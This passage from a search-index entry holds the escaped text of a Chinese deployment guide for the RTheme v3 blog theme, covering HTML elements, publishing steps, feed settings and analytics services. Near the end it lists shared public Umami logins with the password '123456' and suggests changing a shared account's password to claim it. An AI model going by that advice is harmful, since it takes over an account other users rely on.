t;&lt;rt&gt;zi&lt;/rt&gt;&lt;rp&gt;)&lt;/rp&gt;&lt;/ruby&gt;&amp;nbsp;&lt;h4&gt;下标&lt;/h4&gt;&amp;nbsp;这段文本包含&amp;nbsp;&lt;sub&gt;下标&lt;/sub&gt;&amp;nbsp;&lt;h4&gt;上标&lt;/h4&gt;&amp;nbsp;这段文本包含&amp;nbsp;&lt;sup&gt;上标&lt;/sup&gt;&amp;nbsp;粗体&amp;nbsp;你可以加粗一段文字。&amp;nbsp;强调&amp;nbsp;你可以强调一段文字。&amp;nbsp;斜体&amp;nbsp;你可以斜体显示一段文字。&amp;nbsp;下划线&amp;nbsp;你可以为一段文字添加下划线。&amp;nbsp;删除线&amp;nbsp;你可以删除一段文字。&amp;nbsp;添加线&amp;nbsp;你可以添加一段文字。&amp;nbsp;键盘文本&amp;nbsp;你可以用TAB和SHITF+TAB来在网页中移动。&amp;nbsp;行内引用&amp;nbsp;《国语·周语下》是众口铄金，积毁销骨的出处。&amp;nbsp;引用来源&amp;nbsp;这篇文章来源于RavelloH的博客。&amp;nbsp;突出显示&amp;nbsp;这段文字是高亮突出显示的。&amp;nbsp;注音&amp;nbsp;汉&amp;nbsp;(&amp;nbsp;han&amp;nbsp;)&amp;nbsp;字&amp;nbsp;(&amp;nbsp;zi&amp;nbsp;)&amp;nbsp;下标&amp;nbsp;这段文本包含&amp;nbsp;下标&amp;nbsp;上标&amp;nbsp;这段文本包含&amp;nbsp;上标&amp;nbsp;媒体内容&amp;nbsp;图片&amp;nbsp;主题会自动的为图片进行样式重组，以显示图片的描述等。&amp;nbsp;在默认情况下，图片中包含的alt信息将会被主题显示在图片底部。&amp;nbsp;&lt;img&amp;nbsp;src=&quot;https://drive.ravelloh.top/api/raw/?path=/img/Sekiro%E2%84%A2_%20Shadows%20Die%20Twice_20220827210734.jpg&quot;&amp;nbsp;alt=&quot;游戏《只狼-影逝二度》中的成就截图&quot;&gt;&amp;nbsp;视频&amp;nbsp;&lt;video&amp;nbsp;src=&quot;https://drive.ravelloh.top/api/raw/?path=/video/鬼泣5_片段.mp4&quot;&amp;nbsp;controls=&quot;controls&quot;&gt;&lt;/video&gt;&amp;nbsp;音频&amp;nbsp;你可以使用传统的audio标签来嵌入音频，不过实际上更好的选择是使用RTheme的内置播放器。&amp;nbsp;你可以参考#箱式音乐盒来配置。&amp;nbsp;时间&amp;nbsp;&lt;time&gt;2023-08-14&amp;nbsp;10:46:53&lt;/time&gt;&amp;nbsp;主题会自动的为time标签加入切换选项，你可以点击下方的时间试试。&amp;nbsp;2023-08-14&amp;nbsp;10:46:53&amp;nbsp;大型文本框&amp;nbsp;&lt;textarea&amp;nbsp;name=&quot;test&quot;&amp;nbsp;id=&quot;test&quot;&amp;nbsp;rows=&quot;4&quot;&amp;nbsp;cols=&quot;40&quot;&amp;nbsp;placeholder=&quot;这是一个文本框&quot;&gt;&lt;/textarea&gt;&amp;nbsp;表格&amp;nbsp;&lt;table&gt;&amp;nbsp;&lt;thead&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;th&gt;功能名&lt;/th&gt;&amp;nbsp;&lt;th&gt;描述&lt;/th&gt;&amp;nbsp;&lt;th&gt;可选值&lt;/th&gt;&amp;nbsp;&lt;th&gt;默认值&lt;/th&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;/thead&gt;&amp;nbsp;&lt;tbody&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;td&gt;showall&lt;/td&gt;&amp;nbsp;&lt;td&gt;是否展示所有文件及目录&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes/no&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes&lt;/td&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;td&gt;showdirectoryname&lt;/td&gt;&amp;nbsp;&lt;td&gt;仅展示文件夹名&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes/no&lt;/td&gt;&amp;nbsp;&lt;td&gt;no&lt;/td&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;td&gt;showchangetime&lt;/td&gt;&amp;nbsp;&lt;td&gt;显示更改时间(废弃参数，不可用)&lt;/td&gt;&amp;nbsp;&lt;td&gt;-&lt;/td&gt;&amp;nbsp;&lt;td&gt;no&lt;/td&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;td&gt;showsize&lt;/td&gt;&amp;nbsp;&lt;td&gt;以字节为单位，显示文件大小&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes/no&lt;/td&gt;&amp;nbsp;&lt;td&gt;no&lt;/td&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;td&gt;showallname&lt;/td&gt;&amp;nbsp;&lt;td&gt;显示相对路径&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes/no&lt;/td&gt;&amp;nbsp;&lt;td&gt;no&lt;/td&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;tr&gt;&amp;nbsp;&lt;td&gt;ignoregit&lt;/td&gt;&amp;nbsp;&lt;td&gt;隐藏.git文件&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes/no&lt;/td&gt;&amp;nbsp;&lt;td&gt;yes&lt;/td&gt;&amp;nbsp;&lt;/tr&gt;&amp;nbsp;&lt;/tbody&gt;&amp;nbsp;&lt;/table&gt;&amp;nbsp;功能名&amp;nbsp;描述&amp;nbsp;可选值&amp;nbsp;默认值&amp;nbsp;showall&amp;nbsp;是否展示所有文件及目录&amp;nbsp;yes/no&amp;nbsp;yes&amp;nbsp;showdirectoryname&amp;nbsp;仅展示文件夹名&amp;nbsp;yes/no&amp;nbsp;no&amp;nbsp;showchangetime&amp;nbsp;显示更改时间(废弃参数，不可用)&amp;nbsp;-&amp;nbsp;no&amp;nbsp;showsize&amp;nbsp;以字节为单位，显示文件大小&amp;nbsp;yes/no&amp;nbsp;no&amp;nbsp;showallname&amp;nbsp;显示相对路径&amp;nbsp;yes/no&amp;nbsp;no&amp;nbsp;ignoregit&amp;nbsp;隐藏.git文件&amp;nbsp;yes/no&amp;nbsp;yes&amp;nbsp;列表&amp;nbsp;&lt;ul&gt;&amp;nbsp;&lt;li&gt;Coffee&lt;/li&gt;&amp;nbsp;&lt;li&gt;Tea&amp;nbsp;&lt;ul&gt;&amp;nbsp;&lt;li&gt;Black&amp;nbsp;tea&lt;/li&gt;&amp;nbsp;&lt;li&gt;Green&amp;nbsp;tea&amp;nbsp;&lt;ol&gt;&amp;nbsp;&lt;li&gt;China&lt;/li&gt;&amp;nbsp;&lt;li&gt;Africa&lt;/li&gt;&amp;nbsp;&lt;/ol&gt;&amp;nbsp;&lt;/li&gt;&amp;nbsp;&lt;/ul&gt;&amp;nbsp;&lt;/li&gt;&amp;nbsp;&lt;li&gt;Milk&lt;/li&gt;&amp;nbsp;&lt;/ul&gt;&amp;nbsp;Coffee&amp;nbsp;Tea&amp;nbsp;Black&amp;nbsp;tea&amp;nbsp;Green&amp;nbsp;tea&amp;nbsp;China&amp;nbsp;Africa&amp;nbsp;Milk&amp;nbsp;分隔线&amp;nbsp;主题中的分割线一共分为两种，你可以在其中自由使用。&amp;nbsp;它们的区别是，有light类名的hr标签会比默认标签更细、边距更小，推荐在文章内部使用。&amp;nbsp;同时，为了保证一定的段落间隔，推荐在使用时加上两个br标签，总体如下：&amp;nbsp;&lt;br&gt;&lt;br&gt;&lt;hr&amp;nbsp;class=&quot;light&quot;&gt;&amp;nbsp;&lt;hr&amp;nbsp;class=&quot;light&quot;&gt;&amp;nbsp;&lt;hr&gt;&amp;nbsp;效果：&amp;nbsp;图标&amp;nbsp;RTheme使用Remix&amp;nbsp;icon作为本体的默认图标集。你可以自由使用持续更新的超过2500个风格统一的图标。&amp;nbsp;使用方法非常简单，但首先你需要找到你需要的图标：&amp;nbsp;Icones.js&amp;nbsp;-&amp;nbsp;Remix&amp;nbsp;Icon&amp;nbsp;你可以在其中搜索来找到你需要的图标。之后，单击需要的图标，复制其名称（格式如ri:xxxxx）&amp;nbsp;之后，你可以这样使用该图标：&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:thumb-up-fill&quot;&gt;&lt;/span&gt;&amp;nbsp;效果见此：&amp;nbsp;除了i_small，主题中内置5种不同大小的图标，你可以自由使用。&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:thumb-up-fill&quot;&gt;&lt;/span&gt;&lt;br&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_mini&amp;nbsp;ri:thumb-up-fill&quot;&gt;&lt;/span&gt;&lt;br&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i&amp;nbsp;ri:thumb-up-fill&quot;&gt;&lt;/span&gt;&lt;br&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_big&amp;nbsp;ri:thumb-up-fill&quot;&gt;&lt;/span&gt;&lt;br&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_large&amp;nbsp;ri:thumb-up-fill&quot;&gt;&lt;/span&gt;&lt;br&gt;&amp;nbsp;编写并发布文章&amp;nbsp;注：在进行接下来的操作之前，请确认你已经对你的站点进行过个性化设置，即已经将自己的信息替换至主题内&amp;nbsp;你可以使用上文中的HTML语法或转换成HTML的markdown语法自由创作。之后，使用下面的步骤来发布它：&amp;nbsp;确定文章信息&amp;nbsp;你需要确定文章的信息。这包括如下信息:&amp;nbsp;值&amp;nbsp;描述&amp;nbsp;${articlesName}&amp;nbsp;文章的标题，不宜过长&amp;nbsp;${articlesPath}&amp;nbsp;指定其在/articles/文件夹中的路径，默认应该是一串无分隔的日期，如20230815&amp;nbsp;${articlesTime}&amp;nbsp;文章的发布日期，如2023-08-15&amp;nbsp;${articlesClass}&amp;nbsp;文章的分类，数量不限&amp;nbsp;${articlesTag}&amp;nbsp;文章的标签，数量不限&amp;nbsp;${articlesContext}&amp;nbsp;文章的内容&amp;nbsp;复制模板文件&amp;nbsp;前往你的主题根目录下的/articles/文件夹，创建一个新的文件夹用于保存你的新文章。&amp;nbsp;建议这个新的文件夹名为${articlesPath}，也就是一串无分隔的日期，能表示其发布时间，如20230815。这样可以帮助搜索引擎索引此文章。&amp;nbsp;复制文件，将根目录下的模板文件/template/articles/index.html复制到你的新文章的位置/articles/${articlesPath}/index.html。&amp;nbsp;更改文章信息&amp;nbsp;编辑你复制到新位置的新文章，修改其中的变量。变量包括#确定文章信息中的6个变量。&amp;nbsp;你可以an自己的需要，增加或减少文章的分类和标签的数量。默认情况下，模板中提供了3个标签和3个分类。&amp;nbsp;在此过程中，你可以随时预览文章的显示效果。你需要先安装Node.js环境，之后使用命令行工具转到主题根目录，之后运行：&amp;nbsp;npx&amp;nbsp;http-server&amp;nbsp;-c-1&amp;nbsp;这样，你会将主题暂时部署在本地，以预览其效果。默认的预览地址是http://localhost:8080&amp;nbsp;更改索引信息&amp;nbsp;等到文章更改完毕后，打开/articles/index.html，添加你的新文章。它的模板内容如下：&amp;nbsp;&lt;div&amp;nbsp;class=&quot;loading&amp;nbsp;listprogram&quot;&gt;&amp;nbsp;&lt;article&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;article-name&quot;&gt;&amp;nbsp;&lt;h4&gt;&lt;a&amp;nbsp;href=&quot;/articles/${articlesPath}/&quot;&gt;${articlesName}&lt;/a&gt;&lt;/h4&gt;&amp;nbsp;&lt;/span&gt;&amp;nbsp;&lt;p&amp;nbsp;class=&quot;articles-info&quot;&gt;&amp;nbsp;&lt;time&gt;${articlesTime}&lt;/time&gt;&amp;nbsp;•&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:archive-line&quot;&gt;&lt;/span&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;class&quot;&gt;&amp;nbsp;&lt;a&gt;${articlesClass}&lt;/a&gt;/&amp;nbsp;&lt;a&gt;${articlesClass}&lt;/a&gt;/&amp;nbsp;&lt;a&gt;${articlesClass}&lt;/a&gt;&amp;nbsp;&lt;/span&gt;&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;p&amp;nbsp;class=&quot;articles-tags&quot;&gt;&amp;nbsp;&lt;a&gt;${articlesTag}&lt;/a&gt;&amp;nbsp;&lt;a&gt;${articlesTag}&lt;/a&gt;&amp;nbsp;&lt;a&gt;${articlesTag}&lt;/a&gt;&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;/article&gt;&amp;nbsp;&lt;hr&gt;&amp;nbsp;&lt;/div&gt;&amp;nbsp;之后，同样的将其中的变量修改为#确定文章信息中的6个变量。&amp;nbsp;发布更改&amp;nbsp;至此，你的新文章已经添加完成。如果你使用Github存储主题，直接使用git提交即可。RTheme框架会在云端自动使用Github&amp;nbsp;Actions来为你的文章更新索引、订阅信息及站点地图、旁路推荐等。&amp;nbsp;不过，如果没有使用Github，你也可以在本地提前运行。转到你的主题根目录，运行以下命令：&amp;nbsp;cd&amp;nbsp;program&amp;nbsp;npm&amp;nbsp;install&amp;nbsp;node&amp;nbsp;search.js&amp;nbsp;node&amp;nbsp;feed.js&amp;nbsp;node&amp;nbsp;fileList.js&amp;nbsp;这样，RTheme会在本地完成以上工作。之后，将其推送至云端即可。对于git，它大概是：&amp;nbsp;git&amp;nbsp;pull&amp;nbsp;git&amp;nbsp;status&amp;nbsp;git&amp;nbsp;add&amp;nbsp;.&amp;nbsp;git&amp;nbsp;commit&amp;nbsp;-m&amp;nbsp;&quot;添加新文章&quot;&amp;nbsp;git&amp;nbsp;push&amp;nbsp;稍等片刻，访问你的主题，查看你的文章。一切应该按预期工作。&amp;nbsp;高级&amp;nbsp;配置多站点&amp;nbsp;RTheme自带多站点自动测速选优功能。&amp;nbsp;启用该功能，需要在/assets/js/loading.js中更改trustDomain的定义。如果你正常配置了主题，这个列表里应该会包含一个你的域名。&amp;nbsp;如果你有多个域名，你可以将其放在里面来启用负载均衡。格式如下：&amp;nbsp;trustDomain&amp;nbsp;=&amp;nbsp;[&amp;nbsp;&#39;ravelloh.top&#39;,&amp;nbsp;&#39;ravelloh.gitee.io&#39;,&amp;nbsp;&#39;ravelloh.github.io&#39;,&amp;nbsp;&#39;ravelloh.vercel.app&#39;,&amp;nbsp;&#39;ravelloh.js.org&#39;,&amp;nbsp;];&amp;nbsp;配置feed信息&amp;nbsp;主题自带的feed中的信息需要你手动修改。转到/program/feed.js，修改其中的信息。&amp;nbsp;你需要修改的信息有两部分，其余的信息不要随便修改，除非你知道自己正在做什么，以及接下来会发生什么。&amp;nbsp;要修改的部分及其相应的作用如下：&amp;nbsp;const&amp;nbsp;siteDomain&amp;nbsp;=&amp;nbsp;&#39;https://ravelloh.top&#39;;&amp;nbsp;//&amp;nbsp;你的站点域名&amp;nbsp;const&amp;nbsp;authorINFO&amp;nbsp;=&amp;nbsp;{&amp;nbsp;//&amp;nbsp;你的个人信息&amp;nbsp;name:&amp;nbsp;&#39;RavelloH&#39;,&amp;nbsp;email:&amp;nbsp;&#39;ravelloh@outlook.com&#39;,&amp;nbsp;link:&amp;nbsp;&#39;https://ravelloh.top/&#39;,&amp;nbsp;};&amp;nbsp;const&amp;nbsp;feed&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Feed({&amp;nbsp;title:&amp;nbsp;&quot;RavelloH&#39;s&amp;nbsp;Blog&amp;nbsp;/&amp;nbsp;RavelloH的博客&quot;,&amp;nbsp;//&amp;nbsp;标题&amp;nbsp;description:&amp;nbsp;&#39;RSS&amp;nbsp;-&amp;nbsp;博客文章订阅更新&#39;,&amp;nbsp;//&amp;nbsp;描述&amp;nbsp;id:&amp;nbsp;&#39;http://ravelloh.top/&#39;,&amp;nbsp;//&amp;nbsp;id&amp;nbsp;link:&amp;nbsp;&#39;http://ravelloh.top/&#39;,&amp;nbsp;//&amp;nbsp;链接&amp;nbsp;language:&amp;nbsp;&#39;zh&#39;,&amp;nbsp;//&amp;nbsp;语言&amp;nbsp;image:&amp;nbsp;&#39;https://ravelloh.top/assets/images/avatar.jpg&#39;,&amp;nbsp;//&amp;nbsp;封面&amp;nbsp;favicon:&amp;nbsp;&#39;https://ravelloh.top/favicon.ico&#39;,&amp;nbsp;//&amp;nbsp;站点图标&amp;nbsp;copyright:&amp;nbsp;`Copyright&amp;nbsp;©&amp;nbsp;2019&amp;nbsp;-&amp;nbsp;${new&amp;nbsp;Date().getFullYear()}&amp;nbsp;RavelloH.&amp;nbsp;All&amp;nbsp;rights&amp;nbsp;reserved.`,&amp;nbsp;//&amp;nbsp;版权信息&amp;nbsp;generator:&amp;nbsp;&#39;https://github.com/RavelloH/local-feed-generation&#39;,&amp;nbsp;//&amp;nbsp;生成器信息&amp;nbsp;feedLinks:&amp;nbsp;{&amp;nbsp;//&amp;nbsp;订阅链接&amp;nbsp;json:&amp;nbsp;&#39;https://ravelloh.top/feed/feed.json&#39;,&amp;nbsp;atom:&amp;nbsp;&#39;https://ravelloh.top/feed/atom.xml&#39;,&amp;nbsp;rss:&amp;nbsp;&#39;https://ravelloh.top/feed/rss.xml&#39;,&amp;nbsp;},&amp;nbsp;author:&amp;nbsp;authorINFO,&amp;nbsp;});&amp;nbsp;配置边缘服务&amp;nbsp;Twikoo评论&amp;nbsp;默认情况下，Twikoo处于开启状态。要使用Twikoo，只需要在/assets/js/display.js中，修改函数loadComment()的定义，将其中包含的envId:&amp;nbsp;&#39;&#39;(大概在第304行左右)修改为envId:&amp;nbsp;&#39;这里填写你的envId&#39;。&amp;nbsp;至于如何获取envId，详见Twikoo的文档：&amp;nbsp;快速上手&amp;nbsp;-&amp;nbsp;通过CDN引入&amp;nbsp;Umami统计&amp;nbsp;你首先需要一个Umami服务。可以选择自建、Umami&amp;nbsp;Cloud或者使用我的Umami。&amp;nbsp;如果你需要使用我的Umami服务，那最好在评论区评论一下并留下邮箱，我单独给你创建一个账号。&amp;nbsp;不过，我也创建了几个Umami的公共用户，你可以用来试试。&amp;nbsp;不要试图用这些公共用户作为你自己的用户，因为拥有密码的任何人都可以删除你配置的网站信息&amp;nbsp;当然，最好的办法是找一个登录进去，然后更改密码。这样，这个账号就是你的了:)&amp;nbsp;Umami&amp;nbsp;-&amp;nbsp;login&amp;nbsp;账号：public1&amp;nbsp;密码：123456&amp;nbsp;账号：public2&amp;nbsp;密码：123456&amp;nbsp;账号：public3&amp;nbsp;密码：123456&amp;nbsp;之后，获取你的token(详见Umami的官方文档)，以及你的共享token(创建你的站点的共享链接，访问并用开发者工具查看网络信息，复制任意一个含有x-umami-share-token的请求头的网络请求的x-umami-share-token值)。&amp;nbsp;之后，你需要部署你的路由转发服务来隐藏你的Token。详见我的这个项目：&amp;nbsp;Github&amp;nbsp;-&amp;nbsp;RavelloH/umami-api-route&amp;nbsp;然后，在/assets/js/analysis.js中，取消注释函数initAnalytics()中的//&amp;nbsp;umamiAnalytics();，然后修改getRealTimeVisitors()中的token值为你的共享token，并取消位于定义最上方的return&amp;nbsp;false，之后修改函数getPageVisitors()的定义，删除其最上方的内容，并将下方的apiURL中的https://analytics.api.ravelloh.top修改为你自己的路由转发API地址。&amp;nbsp;最后，转到/assets/js/script.js，修改refreshInfo()的定义(大概在790行)，将定义最下方的包含接入Umami字样的注释取消即可。&amp;nbsp;都修改完成后，所有功能应该正常工作。&amp;nbsp;BetterStack的Uptime服务&amp;nbsp;同样，你需要先获取一个Uptime&amp;nbsp;token，并建立一个转发服务。详见我的另一个项目：&amp;nbsp;Github&amp;nbsp;-&amp;nbsp;RavelloH/uptime-api-route&amp;nbsp;之后，转到/assets/js/analysis.js，修改loadUptime的定义，将site的值修改为你的路由转发API地址。&amp;nbsp;接着，转到/assets/js/i18n.js，将其中structureInfobarInfo()的定义的返回值中最后几行的包含需要先配置Uptime字样的注释取消，&amp;nbsp;最后，转到/assets/js/script.js，修改refreshInfo()的定义(大概在790行)，将定义最下方的包含接入Uptime模块字样的注释取消即可。&amp;nbsp;都修改完成后，所有功能应该正常工作。&amp;nbsp;修改设置项&amp;nbsp;RTheme的设置项使用列表存储，动态创建生成，因此修改十分方便。&amp;nbsp;如果你修改了上方的功能（这些功能在设置中默认存在，但被注释隐藏掉了），可以取消注释以显示它们。&amp;nbsp;默认的定义在/assets/js/i18n.js中，如下：&amp;nbsp;function&amp;nbsp;valueSettingItems()&amp;nbsp;{&amp;nbsp;return&amp;nbsp;[&amp;nbsp;[&#39;启用PJAX加载模式&#39;,&amp;nbsp;&#39;允许进行非刷新式页面请求，启用单页应用程序模式&#39;,&amp;nbsp;&#39;EnablePjaxLoad&#39;],&amp;nbsp;[&#39;启用PJAX&amp;nbsp;Debug模式&#39;,&amp;nbsp;&#39;允许输出更多调试信息&#39;,&amp;nbsp;&#39;EnablePjaxDebug&#39;,&amp;nbsp;&#39;&#39;],&amp;nbsp;[&#39;启用instant.page预加载&#39;,&amp;nbsp;&#39;启动被动式预加载，提高响应速率&#39;,&amp;nbsp;&#39;EnableInstantPage&#39;],&amp;nbsp;[&#39;启用API预检查&#39;,&amp;nbsp;&#39;允许预先请求API地址，以预先选择响应速度更快的API&#39;,&amp;nbsp;&#39;EnableApiPrecheck&#39;],&amp;nbsp;/*&amp;nbsp;[&amp;nbsp;&#39;启用BaiduStatistics分析器&#39;,&amp;nbsp;&#39;允许将部分访问情况提交至统计服务器，以帮助分析页面&#39;,&amp;nbsp;&#39;EnableBaiduTongji&#39;,&amp;nbsp;&#39;&#39;,&amp;nbsp;],&amp;nbsp;*/&amp;nbsp;/*&amp;nbsp;[&amp;nbsp;&#39;启用Umami&amp;nbsp;Analytics分析器&#39;,&amp;nbsp;&#39;允许与自建Umami服务通信，以统计页面访问情况&#39;,&amp;nbsp;&#39;EnableUmamiAnalytics&#39;,&amp;nbsp;],&amp;nbsp;[&#39;启用Umami&amp;nbsp;数据缓存&#39;,&amp;nbsp;&#39;允许使用会话存储以优化部分性能&#39;,&amp;nbsp;&#39;EnableUmamiCache&#39;,&amp;nbsp;&#39;&#39;],&amp;nbsp;[&amp;nbsp;&#39;启用Umami&amp;nbsp;事件统计&#39;,&amp;nbsp;&#39;允许提交部分UI交互情况统计。会造成额外的网络请求&#39;,&amp;nbsp;&#39;EnableUmamiEvents&#39;,&amp;nbsp;],&amp;nbsp;[&#39;启用Umami&amp;nbsp;API&#39;,&amp;nbsp;&#39;允许从Umami服务获取实时访客量等信息&#39;,&amp;nbsp;&#39;EnableUmamiAPI&#39;],&amp;nbsp;*/&amp;nbsp;/*&amp;nbsp;[&#39;启用Twikoo评论&#39;,&amp;nbsp;&#39;允许与评论服务器通信，以实现评论操作&#39;,&amp;nbsp;&#39;EnableComment&#39;],&amp;nbsp;*/&amp;nbsp;[&amp;nbsp;&#39;接管下载事件&#39;,&amp;nbsp;&#39;允许使用主题框架下载管理器替代浏览器下载，显示更多信息&#39;,&amp;nbsp;&#39;EnableDownloadFunction&#39;,&amp;nbsp;],&amp;nbsp;[&amp;nbsp;&#39;使用Fetch下载模式&#39;,&amp;nbsp;&#39;使用fetch代替XMLHttpRequest下载，将无法显示进度&#39;,&amp;nbsp;&#39;UseFetchDownload&#39;,&amp;nbsp;&#39;&#39;,&amp;nbsp;],&amp;nbsp;[&amp;nbsp;&#39;启用音乐状态保存&#39;,&amp;nbsp;&#39;允许将当前音乐播放列表保存至Cookie中，在页面重载后载入&#39;,&amp;nbsp;&#39;EnableMusicStateStorage&#39;,&amp;nbsp;],&amp;nbsp;[&#39;启用自动登录&#39;,&amp;nbsp;&#39;允许在访问时自动以登录身份重新刷新令牌&#39;,&amp;nbsp;&#39;EnableAutoLogin&#39;],&amp;nbsp;/*&amp;nbsp;[&#39;启用站点状态显示&#39;,&amp;nbsp;&#39;允许访问Uptime服务以显示站点服务状态&#39;,&amp;nbsp;&#39;EnableUptime&#39;],&amp;nbsp;*/&amp;nbsp;[&#39;启用目录高亮&#39;,&amp;nbsp;&#39;在显示目录时自动高亮正在阅读的位置&#39;,&amp;nbsp;&#39;EnableMenuHighlight&#39;],&amp;nbsp;[&#39;启用高级超链接&#39;,&amp;nbsp;&#39;允许渲染部分高级形式超链接&#39;,&amp;nbsp;&#39;EnableAdvanceLink&#39;],&amp;nbsp;[&#39;启用标题重组&#39;,&amp;nbsp;&#39;在页面加载时自动重组标题，以提供高级锚点功能&#39;,&amp;nbsp;&#39;EnableUpdateMenu&#39;],&amp;nbsp;[&#39;启用图片预加载&#39;,&amp;nbsp;&#39;允许在页面加载时自动触发后文图片预加载&#39;,&amp;nbsp;&#39;EnableImgPrefetch&#39;],&amp;nbsp;[&#39;启用图片重组&#39;,&amp;nbsp;&#39;在页面加载时自动重组图片，以提供描述功能&#39;,&amp;nbsp;&#39;EnableImgReset&#39;],&amp;nbsp;[&#39;启用生成页面模型&#39;,&amp;nbsp;&#39;允许生成页面模型，以进行文章筛选、排序等功能&#39;,&amp;nbsp;&#39;EnablePageModel&#39;],&amp;nbsp;[&#39;启用锚点识别&#39;,&amp;nbsp;&#39;在锚点改变时运行调用相关事件，以进行索引筛选&#39;,&amp;nbsp;&#39;EnableHashCheck&#39;],&amp;nbsp;[&#39;启用导航栏高亮&#39;,&amp;nbsp;&#39;允许在页面路径变化时高亮导航栏&#39;,&amp;nbsp;&#39;EnableNavHighlight&#39;],&amp;nbsp;[&#39;启用图片放大&#39;,&amp;nbsp;&#39;允许在单击图片时放大图片&#39;,&amp;nbsp;&#39;EnableImgZoom&#39;],&amp;nbsp;[&#39;启用消息队列&#39;,&amp;nbsp;&#39;启用右下方消息队列以显示更多信息&#39;,&amp;nbsp;&#39;EnableMessage&#39;],&amp;nbsp;[&#39;启用索引数据拉取&#39;,&amp;nbsp;&#39;允许使用索引数据以进行搜索&#39;,&amp;nbsp;&#39;EnableSearchDataGet&#39;],&amp;nbsp;[&#39;跳过模型验证&#39;,&amp;nbsp;&#39;跳过本地与云端数据模型匹配&#39;,&amp;nbsp;&#39;EnableSkipModelTest&#39;,&amp;nbsp;&#39;&#39;],&amp;nbsp;[&#39;启用文章旁路推荐&#39;,&amp;nbsp;&#39;允许在文章结尾链接至上一篇/下一篇文章&#39;,&amp;nbsp;&#39;EnableArticlesRecommand&#39;],&amp;nbsp;];&amp;nbsp;}&amp;nbsp;其中，列表中的每一项有四个属性，分别是[显示名称,显示描述,标识名称,默认值]&amp;nbsp;其中，标识名称是在cookies中存储此值的名称，例如若设置为EnablePjaxLoad，那么当此设置项更改时，cookie中的项settingEnablePjaxLoad的值会相应改变。（cookie中的设置项将会被自动加入setting前缀以区分）&amp;nbsp;默认值有两个选择，填入&#39;checked&#39;或不提供此参数表示默认开启，填入&#39;&#39;表示默认关闭。&amp;nbsp;具体使用时，你可以通过检测cookie的值来决定功能是否运行。例如，你可以使用下面的方式在EnableUmamiAnalytics的值为false时阻断程序运行:&amp;nbsp;if&amp;nbsp;(docCookies.getItem(&#39;settingEnableUmamiAnalytics&#39;)&amp;nbsp;==&amp;nbsp;&#39;false&#39;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;另，感谢@一只鬆扩充此文档，你可以在https://sotkg.cn/articles/20230904/中参考《RThemeV3&amp;nbsp;边缘服务配置》教程以详细了解上方配置过程中的细节。&amp;nbsp;依赖&amp;nbsp;主题依赖以下项目：&amp;nbsp;https://github.com/RavelloH/RPageSearch&amp;nbsp;https://github.com/RavelloH/markdown-it-api&amp;nbsp;https://github.com/RavelloH/local-sitemap-generation&amp;nbsp;https://github.com/RavelloH/local-sitemap-generation&amp;nbsp;https://github.com/Binaryify/NeteaseCloudMusicApi&amp;nbsp;https://github.com/instantpage/instant.page&amp;nbsp;此外，完整版还依赖以下项目：&amp;nbsp;https://github.com/RavelloH/umami-api-route&amp;nbsp;https://github.com/RavelloH/uptime-api-route&amp;nbsp;https://github.com/umami-software/umami&amp;nbsp;https://github.com/imaegoo/twikoo&amp;nbsp;下载&amp;nbsp;你可以在Github中下载v3.0.0的Releases，也可以直接clone本仓库，或者直接下载v3.0.0的构建包。&amp;nbsp;git&amp;nbsp;clone&amp;nbsp;https://github.com/RavelloH/RTheme&amp;nbsp;RTheme-V3.0.0.zip&amp;nbsp;RTheme.v3.0.0.tar.gz&amp;nbsp;Github&amp;nbsp;Releases&amp;nbsp;-&amp;nbsp;RavelloH/RTheme&amp;nbsp;此外，你也可以通过Fork/Use&amp;nbsp;this&amp;nbsp;template来获取此存储库。&amp;nbsp;后记&amp;nbsp;实际上，本来我还想写个API文档，用来解释一下RTheme中的几百个函数的功能和用法，可惜因学业原因完不成了，高考之后再说。&amp;nbsp;不过，我还是为其中的每一项都添加了注释，标明其大概的功能。有需要的可以自行二次开发，也欢迎PR/提ISSUE。&amp;nbsp;转眼，RTheme已经有了160+&amp;nbsp;stars，也算是我的一个成功的项目。以上就是RTheme&amp;nbsp;v3的部署指南，终。&amp;nbsp;","img":["/articles/20230815/google-test-result.png","/articles/20230815/github-actions.png","/articles/20230815/flex-layout.png","/articles/20230815/more-screen.png","/articles/20230815/function.png","/articles/20230815/search.png","/articles/20230815/load-failed.png","/articles/20230815/music-search.png","/articles/20230815/music-add-pic.png","/articles/20230815/network.png","/articles/20230815/code-highlight.png","/articles/20230815/tag-index.png","/articles/20230815/i18n.png","/articles/20230815/setting.png","/articles/20230815/setting-list.png","/articles/20230815/menu.png","/articles/20230815/download.png","/articles/20230815/vscode-replace.png","/articles/20230815/github-fork.png","/articles/20230815/music-add.png","https://drive.ravelloh.top/api/raw/?path=/img/Sekiro%E2%84%A2_%20Shadows%20Die%20Twice_20220827210734.jpg","/articles/2023081